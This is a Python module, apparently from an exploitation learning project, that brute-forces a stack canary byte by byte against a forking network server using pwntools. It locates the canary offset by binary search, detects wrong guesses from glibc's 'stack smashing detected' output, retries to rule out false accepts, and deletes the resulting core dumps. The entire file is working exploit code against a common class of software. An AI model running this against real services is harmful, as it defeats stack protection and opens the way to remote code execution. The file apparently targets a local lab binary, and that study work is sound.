import glob
from dataclasses import dataclass
from pathlib import Path

from pwn import remote

from rop_forge.leak import ForkingServer

_CANARY_SIZE = 8
_ATTEMPT_RECV_TIMEOUT = 0.15
_SMASH_MARKER = b"stack smashing"
_DEFAULT_SEARCH_MAX = 512
_MAX_POSITION_ATTEMPTS = 3


class CanaryNotFoundError(Exception):
    pass


@dataclass(frozen=True)
class CanaryResult:
    offset: int
    canary: bytes


def crack_canary(server: ForkingServer, search_max: int = _DEFAULT_SEARCH_MAX) -> CanaryResult:
    """Byte-by-byte brute force of a live target's stack canary, against a
    persistent forking server (leak.ForkingServer) — the canary is chosen
    once at the parent's startup and inherited unchanged by every forked
    child (fork() semantics, same principle Phase 5's ASLR leak relies on),
    so hundreds of connections against one long-lived server all test the
    *same* secret.

    Detection signal: glibc's __stack_chk_fail() prints "*** stack smashing
    detected ***" to stderr before abort()ing. server_main.c only dup2()s a
    child's stdin/stdout onto the client socket — its stderr stays attached
    to whatever the *parent* inherited, which is exactly what `server.io`
    (a pwntools process(), stderr=STDOUT by default) already reads. So a
    wrong guess is directly observable as that text showing up on
    `server.io`, without needing a corefile at all — the guess/response
    loop never even needs to know or care that overflow occurred, only that
    the child announced its own corruption before dying.

    Each wrong guess still triggers a real SIGABRT core dump underneath
    (this project's containers run with core dumps enabled) — cleaned up
    after every attempt so a full ~2000-attempt crack doesn't leave
    thousands of stray `qemu_*.core` files behind (see ENGINEERING_LOG.md).
    """
    offset = _find_canary_offset(server, search_max)
    canary = bytearray()
    for position in range(_CANARY_SIZE):
        canary.append(_find_byte_at_position(server, offset, canary, position))
    return CanaryResult(offset=offset, canary=bytes(canary))


def _find_byte_at_position(server: ForkingServer, offset: int, canary: bytearray, position: int) -> int:
    # A "no smash" reading for a *wrong* guess (a false negative — the
    # smash message genuinely didn't arrive within _ATTEMPT_RECV_TIMEOUT,
    # e.g. under real scheduling jitter on shared CI hardware) must not be
    # accepted on a single reading: confirmed for real that a first
    # version of this retry (looping the whole sweep again on total
    # failure) just changed the failure mode from a loud
    # CanaryNotFoundError to a *silently wrong* accepted byte, since nothing
    # re-checked whichever guess happened to read as "not smashing" before
    # trusting it. Requiring two independent "not smashing" readings for
    # the *same* guess before accepting it squares the odds of a false
    # accept — a real wrong guess would need to read as "no smash" twice
    # in a row, not just once.
    for _ in range(_MAX_POSITION_ATTEMPTS):
        for guess in range(256):
            payload = b"A" * offset + bytes(canary) + bytes([guess])
            if not _smashes(server, payload) and not _smashes(server, payload):
                return guess
    raise CanaryNotFoundError(
        f"no working byte found at canary position {position} "
        f"(cracked so far: {bytes(canary).hex()}) after {_MAX_POSITION_ATTEMPTS} attempts"
    )


def _find_canary_offset(server: ForkingServer, search_max: int) -> int:
    """Binary-searches for the canary's own start offset: the boundary
    between "this many overflow bytes never reach the canary" (no smash)
    and "this many bytes start corrupting it" (smash, since arbitrary
    filler is astronomically unlikely to match the real secret)."""
    if not _smashes(server, b"A" * search_max):
        raise CanaryNotFoundError(
            f"no stack-smashing triggered within {search_max} bytes — target "
            "may not have a stack canary, or search_max is too small"
        )
    lo, hi = 0, search_max
    while lo + 1 < hi:
        mid = (lo + hi) // 2
        if _smashes(server, b"A" * mid):
            hi = mid
        else:
            lo = mid
    return lo


def _smashes(server: ForkingServer, payload: bytes) -> bool:
    # A slow-to-arrive "stack smashing" message from the *previous* guess
    # can otherwise still be sitting in server.io's buffer when this
    # guess's own recv() below runs, misattributing a stale crash to the
    # current (possibly correct) byte — a race unlikely to matter under
    # this project's slower QEMU devcontainer, but real on fast native
    # hardware firing ~2000 guesses in quick succession. Draining
    # non-blockingly right before sending narrows that window to (at
    # worst) the gap between this line and the send below, rather than a
    # full previous attempt's cycle time.
    server.io.recv(timeout=0)
    io = remote("127.0.0.1", server.port)
    io.send(payload)
    data = server.io.recv(timeout=_ATTEMPT_RECV_TIMEOUT)
    io.close()
    _cleanup_core_litter(server)
    return _SMASH_MARKER in data


def _cleanup_core_litter(server: ForkingServer) -> None:
    basename = Path(server.binary_path).name
    for path in glob.glob(str(server.cwd / f"qemu_{basename}_*.core")):
        Path(path).unlink(missing_ok=True)
    (server.cwd / "core").unlink(missing_ok=True)
